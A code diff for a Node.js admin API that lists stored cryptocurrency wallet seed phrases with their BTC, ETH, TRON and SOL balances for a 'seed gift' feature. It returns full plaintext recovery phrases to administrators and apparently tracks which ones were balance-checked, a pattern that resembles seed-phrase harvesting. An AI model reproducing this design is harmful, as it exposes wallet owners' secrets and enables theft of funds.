@@ -2121,30 +2121,59 @@ app.get('/api/admin/seed-gifts/giftable', requireAdmin, requireMaster, async (re
     const page = Math.max(1, parseInt(req.query.page) || 1);
     const pageSize = Math.min(50, parseInt(req.query.pageSize) || 20);
     const offset = (page - 1) * pageSize;
-    // 잔고 필터 제거: 관리자가 저장한 모든 시드 표시 (pending/delivered 로 이미 지급된 것만 제외)
+
+    // seed_gifts 테이블이 없을 경우 대비: 서브쿼리 분리
+    let excludeIds = [];
+    try {
+      const [giftRows] = await db.pool.query(
+        `SELECT DISTINCT seed_id FROM seed_gifts WHERE status IN ('pending','delivered')`
+      );
+      excludeIds = giftRows.map(r => r.seed_id);
+    } catch (_) { /* seed_gifts 테이블 없으면 무시 */ }
+
+    const whereClause = excludeIds.length > 0
+      ? `WHERE id NOT IN (${excludeIds.join(',')})` : '';
+
     const [[{ total }]] = await db.pool.query(
-      `SELECT COUNT(*) AS total FROM seeds
-       WHERE id NOT IN (SELECT seed_id FROM seed_gifts WHERE status IN ('pending','delivered'))`
+      `SELECT COUNT(*) AS total FROM seeds ${whereClause}`
     );
+
+    // 잔고 컬럼 존재 여부 확인
+    const [colInfo] = await db.pool.query(`SHOW COLUMNS FROM seeds`);
+    const colNames = colInfo.map(c => c.Field);
+    const hasBal = colNames.includes('balance');
+    const hasBtc = colNames.includes('btc');
+    const hasEth = colNames.includes('eth');
+    const hasTron = colNames.includes('tron');
+    const hasSol = colNames.includes('sol');
+    const hasChecked = colNames.includes('checked');
+
+    const balCols = [
+      hasBal  ? 'COALESCE(balance,0) AS balance'       : '0 AS balance',
+      hasBtc  ? 'COALESCE(btc,0) AS btc'               : '0 AS btc',
+      hasEth  ? 'COALESCE(eth,0) AS eth'               : '0 AS eth',
+      hasTron ? 'COALESCE(tron,0) AS tron'             : '0 AS tron',
+      hasSol  ? 'COALESCE(sol,0) AS sol'               : '0 AS sol',
+      hasChecked ? 'checked, checked_at'               : '0 AS checked, NULL AS checked_at',
+    ].join(', ');
+
     const [rows] = await db.pool.query(
       `SELECT id, user_id,
               CONCAT(SUBSTRING_INDEX(phrase,' ',1), ' ... ',
                      SUBSTRING_INDEX(phrase,' ',-1), ' (',
                      LENGTH(phrase)-LENGTH(REPLACE(phrase,' ',''))+1, '단어)') AS phrase_preview,
               phrase,
-              COALESCE(balance,0) AS balance,
-              COALESCE(btc,0) AS btc, COALESCE(eth,0) AS eth,
-              COALESCE(tron,0) AS tron, COALESCE(sol,0) AS sol,
-              checked, checked_at,
+              ${balCols},
               created_at
        FROM seeds
-       WHERE id NOT IN (SELECT seed_id FROM seed_gifts WHERE status IN ('pending','delivered'))
+       ${whereClause}
        ORDER BY id DESC
        LIMIT ? OFFSET ?`,
       [pageSize, offset]
     );
     res.json({ total, page, pageSize, totalPages: Math.ceil(total / pageSize), items: rows });
   } catch (e) {
+    console.error('[GIFTABLE] 오류:', e.message);
     res.status(500).json({ error: e.message });
   }
 });
